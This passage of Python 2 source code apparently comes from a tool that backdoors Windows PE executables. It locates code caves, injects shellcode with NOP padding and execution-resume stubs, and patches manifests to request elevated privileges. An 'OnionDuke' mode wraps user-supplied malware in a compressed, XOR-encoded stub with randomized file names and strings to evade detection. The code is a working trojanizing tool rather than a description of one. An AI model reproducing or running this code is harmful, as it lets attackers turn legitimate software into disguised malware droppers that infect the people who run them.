        self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
        self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
        if self.VERBOSE is True:
            print 'New Section PointerToRawData'
            print self.flItms['newSectionPointerToRawData']
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
        self.binary.write(self.flItms['ImportTableALL'])
        self.binary.seek(self.flItms['filesize'] + 1, 0)  # moving to end of file
        nop = choice(intelCore.nops)
        if nop > 144:
            self.binary.write(struct.pack('!H', nop) * (self.flItms['VirtualSize'] / 2))
        else:
            self.binary.write(struct.pack('!B', nop) * (self.flItms['VirtualSize']))
        self.flItms['CodeCaveVirtualAddress'] = (self.flItms['SizeOfImage'] +
                                                 self.flItms['ImageBase'])
        self.flItms['buffer'] = int('200', 16)  # bytes
        self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -
                                           self.flItms['PatchLocation'] -
                                           self.flItms['ImageBase'] - 5 +
                                           self.flItms['buffer'])

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = self.SHELL_LEN
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.binary = open(self.FILE, 'r+b')
        self.binary.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:
            for section in self.flItms['Sections']:
                sectionFound = False
                if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                        caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section[0]
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'SizeOfRawData', hex(section[3])
                    print 'PointerToRawData', hex(section[4])
                    print 'End of Raw Data:', hex(section[3] + section[4])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)
        self.binary.close()

    def find_cave(self):
        """This function finds all code caves, allowing the user
        to pick the cave for injecting shellcode."""

        self.flItms['len_allshells'] = ()
        if self.flItms['cave_jumping'] is True:
            for item in self.flItms['allshells']:
                self.flItms['len_allshells'] += (len(item), )
            # TODO: ADD Stub len for zeroing memory here
            self.flItms['len_allshells'] += (len(self.flItms['resumeExe']), )
            SIZE_CAVE_TO_FIND = sorted(self.flItms['len_allshells'])[0]
        else:
            SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
            self.flItms['len_allshells'] = (self.flItms['shellcode_length'], )

        print "[*] Looking for caves that will fit the minimum "\
              "shellcode length of %s" % SIZE_CAVE_TO_FIND
        print "[*] All caves lengths: ", ', '.join([str(i) for i in self.flItms['len_allshells']])
        Tracking = 0
        count = 1
        #BeginCave=0
        caveTracker = []
        caveSpecs = []
        self.binary.seek(0)

        if self.PATCH_METHOD == 'automatic':
            #  This is so much faster than the other

            cave_set = set()
            for k, item in enumerate(sorted(self.flItms['len_allshells'])):
                cave_buffer = "\x00" * (item + 8)
                p = re.compile(cave_buffer)
                self.binary.seek(0)
                for m in p.finditer(self.binary.read()):
                    #print m.start(), m.group()
                    caveSpecs.append(m.start() + 4)
                    caveSpecs.append(m.start() + item + 8)
                    caveTracker.append(caveSpecs)
                    caveSpecs = []
            self.binary.seek(0)
        
        else:   
            # Manual Slow method
            while True:
                # TODO: ADD in Fast Mode
                # Jump to near end of .text section and start parsing there.
                try:
                    s = struct.unpack("<b", self.binary.read(1))[0]
                except:     # Exception as e:
                    #print "CODE CAVE", str(e)
                    break
                if s == 0:
                    if count == 1:
                        BeginCave = Tracking
                    count += 1
                else:
                    if count >= SIZE_CAVE_TO_FIND:
                        #Add a four byte buffer between objects
                        caveSpecs.append(BeginCave + 4)
                        caveSpecs.append(Tracking - 4)
                        caveTracker.append(caveSpecs)
                    count = 1
                    caveSpecs = []

                Tracking += 1

        pickACave = {}
        for i, caves in enumerate(caveTracker):
            i += 1
            for section in self.flItms['Sections']:
                sectionFound = False
                try:
                    if caves[0] >= section[4] and \
                       caves[1] <= (section[3] + section[4]) and \
                       caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                        if self.VERBOSE is True:
                            print "Inserting code in this section:", section[0]
                            print '->Begin Cave', hex(caves[0])
                            print '->End of Cave', hex(caves[1])
                            print 'Size of Cave (int)', caves[1] - caves[0]
                            print 'SizeOfRawData', hex(section[3])
                            print 'PointerToRawData', hex(section[4])
                            print 'End of Raw Data:', hex(section[3] + section[4])
                            print '*' * 50
                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                            5 - self.flItms['PatchLocation'])

                        sectionFound = True
                        pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                        caves[1] - caves[0], hex(section[4]),
                                        hex(section[3] + section[4]), JMPtoCodeAddress,
                                        section[1], section[2]]
                        break
                except:
                    print "-End of File Found.."
                    break
                if sectionFound is False:
                    if self.VERBOSE is True:
                        print "No section"
                        print '->Begin Cave', hex(caves[0])
                        print '->End of Cave', hex(caves[1])
                        print 'Size of Cave (int)', caves[1] - caves[0]
                        print '*' * 50

                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - self.flItms['PatchLocation'])
                try:
                    pickACave[i] = [None, hex(caves[0]), hex(caves[1]),
                                    caves[1] - caves[0], None,
                                    None, JMPtoCodeAddress]
                except:
                    print "EOF"

        CavesPicked = {}

        if self.PATCH_METHOD.lower() == 'automatic':
            print "[*] Attempting PE File Automatic Patching"
            availableCaves = {}
            # Take away the rsrc restriction, solved
            for caveNumber, caveValues in pickACave.iteritems():
                if caveValues[0] is None:
                    continue
                elif caveValues[3] >= 50:
                    availableCaves[caveNumber] = caveValues[3]
                        
            #serialize caves:

            payloadDict = {}
            for k, item in enumerate(self.flItms['len_allshells']):
                payloadDict[k] = item
                
            # choose other Caves first.

            while True:
                # for tracking sections to change perms on
                trackSectionName = set()

                # other caves first
                for ref in sorted(payloadDict.items(), key=operator.itemgetter(1), reverse=True):
                    # largest first
                    # now drop the caves that are big enough in a set
                    # and randomly select from it
                    _tempCaves = {}
                    if _tempCaves == {}:
                        # nothing? get out
                        for refnum, caveSize in availableCaves.iteritems():
                            if caveSize >= ref[1]:
                                _tempCaves[refnum] = caveSize
                        if _tempCaves == {}:
                            break
                    selection = choice(_tempCaves.keys())
                    print '[!] Selected:', str(selection) + ":", ("Section Name: {0}; Cave begin: {1} End: {2}; "
                                                                  "Cave Size: {3}; Payload Size: {4}".format(pickACave[selection][0], pickACave[selection][1],
                                                                                          pickACave[selection][2], pickACave[selection][3], ref[1]
                                                                                          ))
                    trackSectionName.add(pickACave[selection][0])
                    #remove the selection from the dict
                    popSet = set()
                    for cave_ref, cave_vals in availableCaves.iteritems():
                        if pickACave[cave_ref][1] <= pickACave[selection][1] <= pickACave[cave_ref][2] or \
                            pickACave[cave_ref][1] <= pickACave[selection][2] <= pickACave[cave_ref][2] or \
                            pickACave[selection][1] <= pickACave[cave_ref][1] <= pickACave[selection][2] or \
                            pickACave[selection][1] <= pickACave[cave_ref][2] <= pickACave[selection][2]:
                            popSet.add(cave_ref)
                    for item in popSet:
                        availableCaves.pop(item)     
                    if selection in availableCaves.keys():
                        availableCaves.pop(selection)
                    CavesPicked[ref[0]] = pickACave[selection]
                break

            if len(CavesPicked) != len(self.flItms['len_allshells']):
                print "[!] Did not find suitable caves - trying next method"
                if self.flItms['cave_jumping'] is True:
                    return 'single'
                else:
                    return 'append'

            if self.CHANGE_ACCESS is True:
                for cave in trackSectionName:
                    self.change_section_flags(cave)

        elif self.PATCH_METHOD.lower() == 'manual':
            print ("############################################################\n"
                   "The following caves can be used to inject code and possibly\n"
                   "continue execution.\n"
                   "**Don't like what you see? Use jump, single, append, or ignore.**\n"
                   "############################################################")

            for k, item in enumerate(self.flItms['len_allshells']):
                print "[*] Cave {0} length as int: {1}".format(k + 1, item)
                print "[*] Available caves: "

                if pickACave == {}:
                    print "[!!!!] No caves available! Use 'j' for cave jumping or"
                    print "[!!!!] 'i' or 'q' for ignore."
                for ref, details in pickACave.iteritems():
                    if details[3] >= item:
                        print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                               "End: {5}; Cave begin: {1} End: {2}; "
                                               "Cave Size: {3}".format(details[0], details[1], details[2],
                                                                       details[3], details[4], details[5],
                                                                       details[6]))

                while True:
                    try:
                        self.CAVE_MINER_TRACKER
                    except:
                        self.CAVE_MINER_TRACKER = 0

                    print "*" * 50

                    selection = raw_input("[!] Enter your selection: ")
                    try:
                        selection = int(selection)

                        print "[!] Using selection: %s" % selection
                        try:
                            if self.CHANGE_ACCESS is True:
                                if pickACave[selection][0] is not None:
                                    self.change_section_flags(pickACave[selection][0])
                            CavesPicked[k] = pickACave[selection]
                            break
                        except:
                            print "[!!!!] User selection beyond the bounds of available caves."
                            print "[!!!!] Try a number or the following commands:"
                            print "[!!!!] append or a, jump or j, ignore or i, single or s"
                            print "[!!!!] TRY AGAIN."
                            continue
                    except:
                        pass
                    breakOutValues = ['append', 'jump', 'single', 'ignore', 'a', 'j', 's', 'i', 'q']
                    if selection.lower() in breakOutValues:
                        return selection
        else:
            print "[!] Invalid Patching Method"
            return None
        return CavesPicked

    def runas_admin(self):
        """
        This module jumps to .rsrc section and checks for
        the following string: requestedExecutionLevel level="highestAvailable"

        """
        #g = open(flItms['filename'], "rb")
        result = False
        print "[*] Checking Execution Level"
        if 'rsrcPointerToRawData' in self.flItms:
            search_lngth = len('requestedExecutionLevel level="highestAvailable"')
            data_read = 0
            while data_read < (self.flItms['rsrcPointerToRawData'] +
                               self.flItms['rsrcSizeRawData'] -
                               self.flItms['manifestLOC']):
                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)
                temp_data = self.binary.read(search_lngth)
                if temp_data == 'requestedExecutionLevel level="highestAvailable"':
                    result = True
                    break
                data_read += 1

        if result is True:
            print "[*] %s must run with highest available privileges" % self.FILE
        else:
            print "[*] %s does not require highest available privileges" % self.FILE

        return result

    def patch_runlevel(self):
        """
        This module jumps to .rsrc section and checks for
        the following string: requestedExecutionLevel level="highestAvailable"
        and if not there patches it in

        """
        #g = open(flItms['filename'], "rb")
        result = False
        print "[*] Checking execution Level"
        if 'rsrcPointerToRawData' in self.flItms:
            search_lngth = len('requestedExecutionLevel')
            data_read = 0
            found_exeLevel = True
            while data_read < (self.flItms['rsrcPointerToRawData'] +
                               self.flItms['rsrcSizeRawData'] -
                               self.flItms['manifestLOC']):
                self.binary.seek(self.flItms['manifestLOC'] + data_read, 0)
                temp_data = self.binary.read(search_lngth)
                if temp_data == 'requestedExecutionLevel':
                    found_exeLevel = True
                    search_lngth = len('level=')
                    if self.binary.read(search_lngth + 1) == ' level=':
                        if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
                            print "[*] File already set to highestAvailable execution level"
                            break
                        else:
                            print "[!] Patching 'highestAvailable' in PE Manifest"
                            self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data) + search_lngth + 1, 0)
                            self.binary.write("\"highestAvailable\"")
                            result = True
                            while True:
                                reading_position = self.binary.tell()
                                if self.binary.read(1) != ">":  # end of the xml block
                                    self.binary.seek(reading_position)
                                    self.binary.write("\x20")
                                else:
                                    return True
                                    break
                if temp_data == 'level=' and found_exeLevel is True:
                    #this is what I call a spread out manifest
                    if self.binary.read(len("\"highestAvailable\"")) == "\"highestAvailable\"":
                        print "[*] File already set to highestAvailable execution level"
                        break
                    else:
                        print "[!] Patching 'highestAvailable' in PE Manifest"
                        self.binary.seek(self.flItms['manifestLOC'] + data_read + len(temp_data), 0)
                        self.binary.write("\"highestAvailable\"")
                        result = True

                data_read += 1

        return result

    def parse_rsrc(self):
        '''
        This parses a .rsrc section for quick modification
        '''
        self.rsrc_structure = {}

        def parse_header():
            return {"Characteristics": struct.unpack("<I", self.binary.read(4))[0],
                    "TimeDataStamp": struct.unpack("<I", self.binary.read(4))[0],
                    "MajorVersion": struct.unpack("<H", self.binary.read(2))[0],
                    "MinorVersion": struct.unpack("<H", self.binary.read(2))[0],
                    "NumberOfNamedEntries": struct.unpack("<H", self.binary.read(2))[0],
                    "NumberofIDEntries": struct.unpack("<H", self.binary.read(2))[0],
                    }

        def merge_two_dicts(x, y):
            '''Given two dicts, merge them into a new dict as a shallow copy.'''
            z = x.copy()
            z.update(y)
            return z

        def parse_data_entry():
            return {"WriteME": self.binary.tell(),
                    "RVA of Data": struct.unpack("<I", self.binary.read(4))[0],
                    "Size": struct.unpack("<I", self.binary.read(4))[0],
                    "CodePage": struct.unpack("<I", self.binary.read(4))[0],
                    "Reserved": struct.unpack("<I", self.binary.read(4))[0]
                    }

        def parse_ID(number):
            temp = {}
            for i in range(0, number):
                _tempid = struct.unpack("<I", self.binary.read(4))[0]
                temp[_tempid] = struct.unpack("<I", self.binary.read(4))[0]
            return temp

        #parse initial header
        if "rsrcPointerToRawData" not in self.flItms:
            return False
        self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
        self.rsrc_structure['Typeheader'] = parse_header()
        self.rsrc_structure['Typeheader']['NameEntries'] = {}
        self.rsrc_structure['Typeheader']["IDentries"] = {}

        if self.rsrc_structure['Typeheader']["NumberofIDEntries"]:
            self.rsrc_structure['Typeheader']["IDentries"] = parse_ID(self.rsrc_structure['Typeheader']["NumberofIDEntries"])
        if self.rsrc_structure['Typeheader']["NumberOfNamedEntries"]:
            self.rsrc_structure['Typeheader']['NameEntries'] = parse_ID(self.rsrc_structure['Typeheader']['NumberOfNamedEntries'])

        #merge, flatten
        self.rsrc_structure['Typeheader']['Entries'] = merge_two_dicts(self.rsrc_structure['Typeheader']["IDentries"],
                                                                       self.rsrc_structure['Typeheader']['NameEntries'])

        for entry, value in self.rsrc_structure['Typeheader']["Entries"].iteritems():
            if entry == 24:  # 24 is the Manifest resource
                self.binary.seek(self.flItms['rsrcPointerToRawData'] + (value & 0xffffff), 0)

                self.rsrc_structure[entry] = parse_header()
                self.rsrc_structure[entry]["IDs"] = {}
                self.rsrc_structure[entry]["Names"] = {}

                if self.rsrc_structure[entry]["NumberofIDEntries"]:
                    self.rsrc_structure[entry]["IDs"] = parse_ID(self.rsrc_structure[entry]["NumberofIDEntries"])

                if self.rsrc_structure[entry]["NumberOfNamedEntries"]:
                #print 'self.rsrc_structure[entry]["NumberOfNamedEntries"]', self.rsrc_structure[entry]["NumberOfNamedEntries"]
                    self.rsrc_structure[entry]["Names"] = parse_ID(self.rsrc_structure[entry]["NumberOfNamedEntries"])

                self.rsrc_structure[entry]["NameIDs"] = merge_two_dicts(self.rsrc_structure[entry]["IDs"],
                                                                        self.rsrc_structure[entry]["Names"])

                #Now get language
                for name_id, offset in self.rsrc_structure[entry]["NameIDs"].iteritems():
                    self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offset & 0xffffff), 0)
                    #print self.rsrc_structure
                    self.rsrc_structure[name_id] = parse_header()
                    self.rsrc_structure[name_id]["IDs"] = {}
                    self.rsrc_structure[name_id]["Names"] = {}

                    if self.rsrc_structure[name_id]["NumberofIDEntries"]:
                        self.rsrc_structure[name_id]["IDs"] = parse_ID(self.rsrc_structure[name_id]["NumberofIDEntries"])

                    if self.rsrc_structure[name_id]["NumberOfNamedEntries"]:
                        self.rsrc_structure[name_id]["Names"] = parse_ID(self.rsrc_structure[name_id]["NumberOfNamedEntries"])

                    self.rsrc_structure[name_id]["language"] = merge_two_dicts(self.rsrc_structure[name_id]["IDs"],
                                                                               self.rsrc_structure[name_id]["Names"])

                    #now get Data Entry Details and write
                    for lanID, offsetDataEntry in self.rsrc_structure[name_id]["language"].iteritems():
                        #print lanID
                        self.binary.seek(self.flItms['rsrcPointerToRawData'] + (offsetDataEntry & 0xffffff), 0)
                        self.rsrc_structure[lanID] = parse_data_entry()
                    #Jump to Manifest
                    self.flItms['manifestLOC'] = (self.flItms['rsrcPointerToRawData'] +
                                                 (self.rsrc_structure[lanID]["RVA of Data"] -
                                                  self.flItms['rsrcVirtualAddress']))

                    return True
        return False

    def support_check(self):
        """
        This function is for checking if the current exe/dll is
        supported by this program. Returns false if not supported,
        returns flItms if it is.
        """
        print "[*] Checking if binary is supported"
        self.flItms['supported'] = False
        #convert to with open FIX
        with open(self.FILE, "r+b") as self.binary:
            if self.binary.read(2) != "\x4d\x5a":
                print "%s not a PE File" % self.FILE
                return False
            if self.gather_file_info_win() is False and self.PATCH_METHOD != "onionduke":
                print "[!] Failure during gathering file info."
                return False
            if self.flItms is False:
                return False
            if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
                for item in self.flItms:
                    print item + ':', self.flItms[item]
                print ("This program does not support this format: %s"
                       % MachineTypes[hex(self.flItms['MachineType'])])
            else:
                self.flItms['supported'] = True
            targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)

            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0 \
               and self.PATCH_DLL is False:
                print "[!] DLL patching not enabled"
                return False

            if self.flItms['Magic'] == int('20B', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64':
                targetFile.pe64_entry_instr()
            elif self.flItms['Magic'] == int('10b', 16) and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
                #if self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x32':
                targetFile.pe32_entry_instr()
            else:
                self.flItms['supported'] = False

            if self.flItms['BoundImportSize'] != 0:
                print "[!] No support for Bound Imports at this time"
                return False

            if self.RUNAS_ADMIN is True and self.SUPPORT_CHECK is True:
                self.parse_rsrc()
                if 'manifestLOC' in self.flItms:
                    self.flItms['runas_admin'] = self.runas_admin()
                else:
                    print '[!] No manifest in rsrc'

            if self.VERBOSE is True:
                self.print_flItms(self.flItms)

            if self.flItms['supported'] is False:
                return False

    def onionduke(self):

        if not any(chiptype not in "armv" for chiptype in subprocess.check_output(["uname", "-a"]).lower()):
            print "[!] Only x86 and x86_64 chipset is supported for OnionDuke due to aPLib support"
            return False
        if 'rsrcSectionName' not in self.flItms:
            print "[!] Missing rsrc section, not patching bianry"
            return False

        if not self.SUPPLIED_BINARY:
            print "[!] No malware provided"
            return False

        od_stub = cStringIO.StringIO()

        stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))

        #print 'stubPath', stubPath

        with open(self.FILE, "r+b") as self.binary:
            #check if OnionDuke Stub
            self.binary.seek(0x5C0, 0)
            if self.binary.read(11) == "\x57\xE8\xE4\x10\x00\x00\x8B\x15\x2C\x20\x41":
                print "[!!!!] Attempting to Patch an OnionDuke wrapped binary"
                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
                # key 0x1FE37D3E
                self.binary.seek(0x413, 0)
                xor_key1 = struct.unpack("<I", self.binary.read(4))[0]

                self.binary.seek(0x429, 0)
                xor_key2 = struct.unpack("<I", self.binary.read(4))[0]
                if xor_key2 == xor_key1:
                    xorkey = xor_key1
                    print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
                    with open(compressedbin, 'r') as compressedBinary:
                        xorBinary = cStringIO.StringIO()
                        xor_file(compressedBinary, xorBinary, xorkey)
                    os.remove(compressedbin)
                else:
                    print "[*] Malformed OnionDuke Sample"
                    return False
                xorBinary.seek(0)
                #get size and location of OD malware
                self.binary.seek(0xfd3c, 0)
                self.od_begin_malware = struct.unpack("<I", self.binary.read(4))[0]
                self.binary.seek(0)
                print "[!] Removing original malware from binary."
                new_stub = self.binary.read(self.od_begin_malware)
                new_stub += xorBinary.read()
                od_stub.write(new_stub)
                self.od_end_malware = od_stub.tell()
                self.od_size_malware = xorBinary.tell()
                print "[*] Appending compressed user supplied binary after target binary"
                od_stub.seek(0xfd40, 0)
                od_stub.write(struct.pack("<I", self.od_size_malware))
                
            else:
                od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
                #copy rsrc to memory
                self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
                self.rsrc_section = cStringIO.StringIO()
                print "[*] Copying rsrc section"
                self.rsrc_section.write(self.binary.read(self.flItms['rsrcSizeRawData']))
                self.rsrc_section.seek(0)
                print "[*] Updating", self.FILE, "rsrc section"
                write_rsrc(self.rsrc_section, self.flItms['rsrcVirtualAddress'], 0x16000)
                self.rsrc_section.seek(0)
                self.od_rsrc_begin = od_stub.tell()
                print "[*] Adding", self.FILE, "rsrc to OnionDuke stub"
                od_stub.write(self.rsrc_section.read())
                self.od_binary_begin = od_stub.tell()

                #compress
                print "[*] Compressing", self.FILE, "with aPLib"
                #USE Tempfile
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                subprocess.check_output(['appack', "c", self.FILE, compressedbin])

                xorkey = random.randint(0, 4294967295)
                print "[*] Xor'ing", self.FILE, "with key:", hex(xorkey)
                with open(compressedbin, 'r') as compressedBinary:
                    xorBinary = cStringIO.StringIO()
                    xor_file(compressedBinary, xorBinary, xorkey)
                xorBinary.seek(0)
                print "[*] Appending compressed binary after rsrc section"
                od_stub.write(xorBinary.read())
                self.od_begin_malware = od_stub.tell()
                os.remove(compressedbin)

                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])

                print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
                with open(compressedbin, 'r') as compressedBinary:
                    xorBinary = cStringIO.StringIO()
                    xor_file(compressedBinary, xorBinary, xorkey)
                xorBinary.seek(0)
                print "[*] Appending compressed user supplied binary after target binary"
                od_stub.write(xorBinary.read())
                self.od_end_malware = od_stub.tell()
                os.remove(compressedbin)

                # update size of image remember to round up the next Section Alignment
                od_stub.seek(0x138, 0)

                if (0x16000 + self.flItms['rsrcVirtualSize'] % self.flItms['SectionAlignment']) != 0:
                    size = ((0x16000 + self.flItms['rsrcVirtualSize']) -
                            ((0x16000 + self.flItms['rsrcVirtualSize']) % self.flItms['SectionAlignment'])
                            + self.flItms['SectionAlignment']
                            )
                else:
                    size = 0x16000 + self.flItms['rsrcVirtualSize']

                # UPDATE STUB
                od_stub.write(struct.pack("<I", size))
                # update Resource Table in optional header SIZE
                od_stub.seek(0x174, 0)
                od_stub.write(struct.pack("<I", self.flItms['rsrcSizeRawData']))

                # update .rsrc
                od_stub.seek(0x288, 0)
                od_stub.write(struct.pack("<I", self.flItms['rsrcVirtualSize']))
                od_stub.seek(0x290, 0)
                od_stub.write(struct.pack("<I", self.flItms['rsrcSizeRawData']))

                #random string in .rdata
                od_stub.seek(0xD250, 0)
                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                              for _ in range(random.randint(6, 12))))

                #random string in .reloc
                od_stub.seek(0x107F0, 0)
                od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                              for _ in range(random.randint(6, 12))))
                # update data section
                od_stub.seek(0xfc28, 0)
                od_stub.write(struct.pack("<I", self.od_binary_begin))
                od_stub.write(struct.pack("<I", self.od_begin_malware - self.od_binary_begin))

            # update xor key in all places (two)
            od_stub.seek(0x413, 0)
            od_stub.write(struct.pack("<I", xorkey))
            od_stub.seek(0x429, 0)
            od_stub.write(struct.pack("<I", xorkey))

            od_stub.seek(0xfd3c, 0)
            od_stub.write(struct.pack("<I", self.od_begin_malware))
            od_stub.write(struct.pack("<I", self.od_end_malware - self.od_begin_malware))

            #update dropped file names
            od_stub.seek(0xfb20, 0)
            od_stub.write(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits)
                          for _ in range(random.randint(6, 12))))

            od_stub.seek(0xfc34, 0)
            _temp_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(4, 8)))
            _temp_name += ".exe"
            od_stub.write(_temp_name)

            #randomize Win32 Version Value
            od_stub.seek(0x134, 0)
            od_stub.write(struct.pack("<I", random.randint(0, 4294967295)))

        #check submitted file to see if it is a DLL:
        with open(self.SUPPLIED_BINARY, 'r') as self.binary:
            print "[?] Checking if user supplied is a DLL"
            self.gather_file_info_win()

            #Check if DLL
            if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0:
                print "[!] User supplied malware is a DLL!"
                print "[*] Patching OnionDuke Stub for DLL usage"
                self.binary.seek(0)
                #patch for dll
                od_stub.seek(0xfd38, 0)
                od_stub.write("\x01\x00\x00\x00")

                #read within a export location for speed.
                for section in reversed(self.flItms['Sections']):
                    if self.flItms['ExportTableRVA'] >= section[2]:
                        #go to exact export directory location
                        self.binary.seek((self.flItms['ExportTableRVA'] - section[2]) + section[4])
                        break

                #read the Image Export Directory for printMessage
                if 'printMessage' not in self.binary.read(self.flItms['ExportTableSize']):
                    #use ordinal #1
                    od_stub.seek(0xfd44, 0)
                    od_stub.write("\x01\x00\x00\x00")
            else:
                print "[*] User supplied malware is not a DLL"

        # write to file
        od_stub.seek(0)
        open(self.OUTPUT, 'w').write(od_stub.read())
        with open(self.OUTPUT, 'r+b') as self.binary:
            self.gather_file_info_win()
            if self.RUNAS_ADMIN is True:
                if self.parse_rsrc() is True:
                    patch_result = self.patch_runlevel()
                    if patch_result is False:
                        print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
                else:
                    print '[!] No manifest in rsrc'

        return True

    def patch_pe(self):

        """
        This function operates the sequence of all involved
        functions to perform the binary patching.
        """
        print "[*] In the backdoor module"
        # TODO: Take out Injector

        if self.INJECTOR is False:
            os_name = os.name
            if not os.path.exists("backdoored"):
                os.makedirs("backdoored")
            if os_name == 'nt':
                self.OUTPUT = "backdoored\\" + self.OUTPUT
            else:
                self.OUTPUT = "backdoored/" + self.OUTPUT

        if self.PATCH_METHOD.lower() == 'replace':
            print "[*] Using replace method, copying supplied binary"
            self.flItms['backdoorfile'] = self.SUPPLIED_BINARY
            shutil.copy2(self.SUPPLIED_BINARY, self.OUTPUT)
            return True

        issupported = self.support_check()

        if issupported is False:
            return None

        if self.PATCH_METHOD == 'onionduke':
            print "[!] Attempting OnionDuke patching"
            # move OS check here.
            result = self.onionduke()
            if result:
                return result
            else:
                print "[!] OnionDuke patching failed"
                return result

        self.flItms['NewCodeCave'] = self.ADD_SECTION
        self.flItms['cave_jumping'] = self.CAVE_JUMPING
        self.flItms['CavesPicked'] = {}
        self.flItms['LastCaveAddress'] = 0
        self.flItms['stager'] = False
        self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
        self.flItms['CavesToFix'] = {}
        self.flItms['XP_MODE'] = self.XP_MODE

        #pulling apis
        if self.check_shells() is False:
            return False

        #Creating file to backdoor
        self.flItms['backdoorfile'] = self.OUTPUT
        shutil.copy2(self.FILE, self.flItms['backdoorfile'])

        if 'apis_needed' in self.flItms:
            self.check_apis(self.FILE)
            if self.flItms['neededAPIs'] != set():
                #ADD new section with IAT here, then patch that binary.
                iat_result = self.create_new_iat()
                if iat_result is False:
                    return False
                print "[*] Checking updated IAT for thunks"
                self.check_apis(self.flItms['backdoorfile'])

        if self.set_shells() is False or self.flItms['allshells'] is False:
            print "[!] Could not set selected shellcode!"
            return False

        self.binary = open(self.flItms['backdoorfile'], "r+b")

        if self.RUNAS_ADMIN is True:
            if self.parse_rsrc() is True:
                patch_result = self.patch_runlevel()
                if patch_result is False:
                    print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
            else:
                print '[!] No manifest in rsrc'

        #reserve space for shellcode
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)

        if self.flItms['Magic'] == int('20B', 16):
            _, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            _, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        shellcode_length = len(self.flItms['shellcode'])

        self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])

        caves_set = False

        # This can be improved. TODO: add parsed caves to a tracking dict
        #  for "single": [caves] and "jump": [caves] for that parsing
        #  does not have to happen over and over again.
        #  Also think about removing None from the equation?
        while caves_set is False and self.flItms['NewCodeCave'] is False:
            self.flItms['CavesPicked'] = self.find_cave()
            if type(self.flItms['CavesPicked']) == str:
                if self.flItms['CavesPicked'].lower() in ['append', 'a']:
                    self.flItms['JMPtoCodeAddress'] = None
                    self.flItms['CodeCaveLOC'] = 0
                    self.flItms['cave_jumping'] = False
                    self.flItms['CavesPicked'] = {}
                    print "[!] Appending new section for payload"
                    self.set_shells()
                    caves_set = True
                elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
